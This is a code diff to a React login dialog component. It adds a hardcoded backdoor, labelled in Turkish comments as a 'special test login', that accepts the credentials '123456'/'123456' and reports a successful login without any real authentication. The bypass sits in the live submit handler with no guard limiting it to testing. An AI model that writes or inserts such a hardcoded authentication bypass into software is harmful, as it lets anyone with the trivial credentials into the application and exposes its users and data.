@@ -47,6 +47,14 @@ const AuthDialog = ({ type, onClose, onSuccess }: AuthDialogProps) => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
+    // Özel test girişi (backdoor) - Test için 123456 ve 123456 kombinasyonu
+    if (isLogin && email === "123456" && password === "123456") {
+      // Doğrudan giriş başarılı kabul et
+      toast.success("Giriş başarılı!");
+      onSuccess();
+      return;
+    }
+    
     if (!email || !password) {
       toast.error("Tüm alanları doldurun");
       return;
